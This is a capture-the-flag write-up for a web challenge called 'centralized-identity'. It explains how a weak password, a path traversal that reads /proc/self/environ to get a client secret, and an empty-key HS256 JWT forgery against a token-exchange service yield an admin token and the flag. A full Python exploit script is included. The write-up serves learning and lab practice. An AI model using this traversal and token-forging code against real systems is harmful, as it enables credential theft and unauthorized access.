# centralized-identity

[library.m0unt41n.ch/challenges/centralized-identity](https://library.m0unt41n.ch/challenges/centralized-identity) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a multi-component application, using a local OpenID authenticator. The exploit
uses path traversal to get credentials and then, weakness in JWT verification code
to get the flag using a forged `admin` token.

# The app structure

All below components are configured with environment variables: `FRONTEND_ENDPOINT`,
`BACKEND_ENDPOINT`, `TOKEN_ENDPOINT`, `IDP_ENDPOINT`, `CLIENT_ID`, `CLIENT_SECRET`
and `FLAG`.

The `.tar.gz` package in the handout can't be easily made to run - most likely, it
is missing the `docker-compose` file, which adds above variables and puts everything
together. The below exploit is only remote.

The application consists of:

## IDP

A generic [Dex IDP](https://dexidp.io/) Docker image

*   Configured with two static passwords, for `admin` and `steve` users.
*   Internally authenticated with `CLIENT_ID` and `CLIENT_SECRET`.
*   Redirecting to `https://FRONTEND_ENDPOINT/oidc/callback` after successful auth.

## Backend

A simple Flask app with three endpoints:

*   `GET /` returns a simple static JSON
*   `GET /name?token=XXXX`:
    *   Decodes provided JWT `token` using `HS256`, `BACKEND_KEY` and `audience="backend"`
    *   Returns `name` from the decoded payload
*   `GET /flag?token=XXXX`
    *   Decodes provided JWT `token` using `HS256`, `BACKEND_KEY` and `audience="backend"`
    *   If `name` in the decoded payload is `admin`, returns the flag

Note: the backend does not use any authentication! Just decodes the tokens.

## Token Exchange

Another simple Flask app:

*   At start, pulls all keys from `IDP_ENDPOINT` into `KEYS` dict (using `GET /keys`)
*   `GET /` returns simple static text
*   `POST /token`, takes `grant_type`, `subject_token`, `subject_token_type` params and:
    *   Checks basic HTTP auth (`CLIENT_ID`/`CLIENT_SECRET`)
    *   Ensures `grant_type` is `urn:ietf:params:oauth:grant-type:token-exchange`
    *   Ensures `subject_token_type` is `urn:ietf:params:oauth:token-type:jwt`
    *   Extracts unverified header from `subject_token`
    *   Extracts `kid` and `alg` from that header
    *   Pulls the key with ID of `kid` from KEYS dict - or `""` if not present
    *   Decodes the `subject_token` using `key`, `audience=CLIENT_ID` and `alg`
    *   Sets `aud` to `backend`
    *   Encodes the token back using `BACKEND_KEY` and returns it

This app is also not subject to OAuth. Just the HTTP Basic auth, with
`CLIENT_ID` and `CLIENT_SECRET`.

## Frontend

This app is mostly behind OAuth (connector is initialized at start, wired into Flask auth logic
and attached to most pages). It has few endpoints:

*   `GET /` - displays static login button, which sends user to `/private` below. This is the
    only endpoint that is not behind OAuth.
*   `GET /private` - another simple template, displaying links to below two. It's subject to
    OAuth, so, first use will redirect user session to the IDP.
*   `GET /flag`
    *   Calls exchange server above (`/token`), sends current JWT auth token (signed by Dex) and
        receives a similar one, but signed with `BACKEND_KEY`.
    *   Uses that token to call calls `/flag` endpoint of the backend and prints the result
*   `GET /page?page=XXX` - renders respective static template
*   `GET /self` - returns some internal data:

    ```json
    {
      "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImViOTQyNTU0NTExZTc3YjE2YWRiNjM0Y2I1MDMxZTRlOGFlMDRiOTEifQ.eyJpc3MiOiJodHRwczovL2JkODM5YjI5LTU3NjktNDE5Yy05ZWNlLTU3NWE5N2QwOTRiYy5saWJyYXJ5Lm0wdW50NDFuLmNoOjMxMzM3LyIsInN1YiI6IkNpUTNOMk0zWVdZMU1TMHlZakJoTFRRM01XUXRPR0U0T0MwNE1qVmpZbUpoWm1ZeE5Ea1NCV3h2WTJGcyIsImF1ZCI6ImZyb250ZW5kIiwiZXhwIjoxNzM2NDU3NjgxLCJpYXQiOjE3MzYzNzEyODEsIm5vbmNlIjoiY3NLb2NybFlCMkNEb2Y2QyIsImF0X2hhc2giOiJHOXFOUFNoR3RtYi13WW5CLVgySFJRIiwibmFtZSI6InN0ZXZlIn0.LGRkXmKgTGyF5JgbnBTAIbq8k-V9816a0toyrmgZ05zaLbiNb0gaDy7_736rnFM5ul-H0ROdauL76iD0xM-gfEadLrwoZNue0gv4ZJ3LXN7i-r8teWYfl_iY4Cg3WP8jVBONhwKxst5XBu8teRbzBvq-ezCe21NfRxSH9ele81XAKr-7FpFhZBm64tNpfjaXZdvX2NiSoiPQYNx6cZDO9VgDclp02f105R6lQs83HIPM_imWULkSf-KuJG0Ejptx6PTivGpKHUu2Lv4BfH1FkK_5Nxo_hQYkfqQLwehSPInqT-1t0sq9VVZfNp2XklyG5dxZd2JumlMOswCeIcAjSA",
      "id_token": {
        "at_hash": "z0JOnLF5bfgkFK__yS9Adw",
        "aud": [
          "frontend"
        ],
        "c_hash": "teKM75FgaCXf88WKwbeMhw",
        "exp": 1736457681,
        "iat": 1736371281,
        "iss": "https://bd839b29-5769-419c-9ece-575a97d094bc.library.m0unt41n.ch:31337/",
        "name": "steve",
        "nonce": "csKocrlYB2CDof6C",
        "sub": "CiQ3N2M3YWY1MS0yYjBhLTQ3MWQtOGE4OC04MjVjYmJhZmYxNDkSBWxvY2Fs"
      },
      "userinfo": {
        "at_hash": "G9qNPShGtmb-wYnB-X2HRQ",
        "aud": "frontend",
        "exp": 1736457681,
        "iat": 1736371281,
        "iss": "https://bd839b29-5769-419c-9ece-575a97d094bc.library.m0unt41n.ch:31337/",
        "name": "steve",
        "nonce": "csKocrlYB2CDof6C",
        "sub": "CiQ3N2M3YWY1MS0yYjBhLTQ3MWQtOGE4OC04MjVjYmJhZmYxNDkSBWxvY2Fs"
      }
    }
    ```

# Analysis

## Passwords

The Dex configuration file contains:

```yaml
staticPasswords:
  - email: "admin@general-management.llc"
    hash: "\$2y\$10\$rahSldYb5MxdLzuOcezHXelX5nS5LdhMvenbf/9AFZ2vCwC3XSX5q" # not bruteforcable
    username: "admin"
    userID: "c3d360f3-5b5c-4288-be52-d2f4906750af"
  - email: "steve@general-management.llc"
    hash: "\$2a\$10\$2b2cU8CPhOTaGrs1HRQuAueS7JTT5ZHsHSzYiFPm1leZck7Mc8T4W" # password
    username: "steve"
    userID: "77c7af51-2b0a-471d-8a88-825cbbaff149"
```

Which suggests that password of `steve` *is* brute-forceable. Which it indeed is - and the
password is `password` &#128578; With that, we can login to the live instance of the app.

## Path traversal in the frontend

The following code:

```python
@app.route("/page")
@auth.oidc_auth("default")
def page():
    page = request.args.get("page")
    if page is None:
        return "Not found", 404
    try:
        with open(f"templates/{page}", "r") as f:
            return f.read()
    except Exception as e:
        print(e)
        return "Not found", 404
```

... contains a simple path traversal bug. Indeed, once we log in, going to
`/page?page=../../../proc/self/environ` returns the full process
environment - and that includes:

```bash
CLIENT_ID=frontend
CLIENT_SECRET=ZMyjEAypRBXCTQMIiqTbT8M8GXiGrSd
```

## Token exchange verification / generation weakness

Purpose of token exchange is to take a `frontend` token and turn it into `backend` token,
signing it with `BACKEND_KEY`. In order to abuse the `/flag` functions in frontend /
backend, we would need a `BACKEND_KEY`-signed token for the `admin` user.

Looking closer at the token exchange code:

```python
def get_value(dict, key):
    return dict.get(key) or ""

(...)

@app.route("/token", methods=["POST"])
def token_exchange():
    (...)
    subject_token = request.form.get("subject_token")
    header = jwt.get_unverified_header(subject_token)
    kid = header.get("kid");
    key = get_value(KEYS, kid)
    payload = jwt.decode(subject_token, key, audience=CLIENT_ID, algorithms=[header.get("alg")])
    payload["aud"] = "backend"
    exchanged_token = jwt.encode(payload, BACKEND_KEY, headers={"kid": "backend"})
    return "{\"access_token\":\""+exchanged_token+"\"}"
```

With the correctly crafted token, we control following behaviors:

*   With a non-existing `kid`, the decoding will be done with an empty `key`.
*   By setting `alg`, we directly control algorithms used by `jwt.decode()`
*   Obviously, we control the username too.

`kid`, `alg` and `key` will be loaded from the token
[without signature verification](https://pyjwt.readthedocs.io/en/latest/usage.html#reading-headers-without-validation).

# The attack

Once we have user password and `CLIENT_ID` / `CLIENT_SECRET`, the only remaining thing
is to craft a token for the exchange server, that would return an `admin` token signed
by `BACKEND_KEY`.

**My initial hunch here was incorrect** &#128577; After
[some Google searching](http://google.com/search?q=jwt.decode+python+algorithm%3Dnone)
and reading [blog](http://blog.pentesteracademy.com/67c14bb15771)
[posts](http://medium.com/@phosmet/a37d670af54f), I have convinced myself that this
has to exploit `none` algorithm and the attack is roughly:

1.  Extract `CLIENT_ID`/`CLIENT_SECRET`, using path traversal in frontend
2.  Craft a `subject_token`:
    *   `name`: `"admin"`
    *   `kid`: something non-existent
    *   `alg`: `"none"`. 
3.  Send `subject_token` to the exchange server, which should decode it without signature
    verification (`alg=None`) and re-encode using `BACKEND_KEY`.
4.  Use resulting token to connect to backend with `/flag?token=XXXXX`, which should return the flag.

This was **almost** correct &#128578; The problem was in crafting the token. The
`jwt.decode()` does **not** completely skip signature verification when the key is empty and/or
`algorithms` are set to `["none"]`. It used to &#128521; but these days, in order for that to work,
you have to add `options={'verify_signature': False}`. But we don't have that here.
Any attempt to send an unsigned token to the exchange resulted in an `Internal Server Error`
and reproducing this locally, got me `jwt.exceptions.InvalidSignatureError: Signature verification failed`.

The alternative approach exploits the fact that **we control the algorithm and the key**.
At least of-sorts - we can cause the key to be empty. Which, surprisingly, is a valid option for
the symmetric `HS256` signature algorithm.

# The exploit

Initialize session, define endpoints started by SHC website:

```python
import jwt
import re
import requests
import urllib3

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
s = requests.Session()

FRONTEND_ENDPOINT = "https://ccd293d7-e55b-46d8-8cf9-d7b80572f301.library.m0unt41n.ch:31337"
IDP_ENDPOINT      = "https://0127eff2-e516-486e-8785-387286dce119.library.m0unt41n.ch:31337"
TOKEN_ENDPOINT    = "https://7c5f3091-6d7b-4623-be3d-3033150308b1.library.m0unt41n.ch:31337"
BACKEND_ENDPOINT  = "https://480bf863-1ae9-4c1c-95f0-e881f79981d1.library.m0unt41n.ch:31337"
```

Simulate clicking `Login here` button on the index page:

```python
s = requests.Session()
r = s.get(FRONTEND_ENDPOINT+"/private")
```

This will perform full redirect to the login form on `BACKEND_ENDPOINT` - and `r.url` will
contain that address, including necessary tokens. Now, simulate entering credentials in
that form:

```python
r = s.post(r.url, data = {
    'login': 'steve@general-management.llc',
    'password': 'password',
})
```

This, again, does all the necessary redirects and, in the end, `r.url` will contain address
of the Dex page for granting the app permissions - and we can simulate submitting that form,
with `Approve` button.

```python
req = re.search(r'name="req" value="([^"]+)', r.text).group(1)
r = s.post(r.url, data = {
    'req': req,
    'approval': 'approve',
})
```

At this point we are logged-in to the frontend app. Time to exfiltrate `CLIENT_ID` and
`CLIENT_SECRET` from the environment:

```python
r = s.get(FRONTEND_ENDPOINT+"/page?page=../../../proc/self/environ")
CLIENT_ID = re.search(r'CLIENT_ID=([^\x00]+)', r.text).group(1)
CLIENT_SECRET = re.search(r'CLIENT_SECRET=([^\x00]+)', r.text).group(1) 
```

(these are `frontend` and `ZMyjEAypRBXCTQMIiqTbT8M8GXiGrSd` respectively and they
don't change when restarting the SHC instance)

Create a forged `admin` token, with empty password and symmetric algorithm:

```python
subject_token = jwt.encode(
    { "name": "admin", "aud": CLIENT_ID },
    key="",
    headers={ "alg": "HS256", "kid": "blabla" }
)
```

Then, the rest is mostly copying code from `frontend.py`.:

```python
basic = requests.auth.HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
r = requests.post(TOKEN_ENDPOINT+"/token", data={
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
    "subject_token": subject_token
}, auth=basic, verify=False)
access_token = r.json().get("access_token")
r = requests.get(BACKEND_ENDPOINT+"/flag", params={"token": access_token}, verify=False)
print(r.text)
```

That prints the flag.

---

## `shc2024{get_unverified_header_is_really_unverified!}`




<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
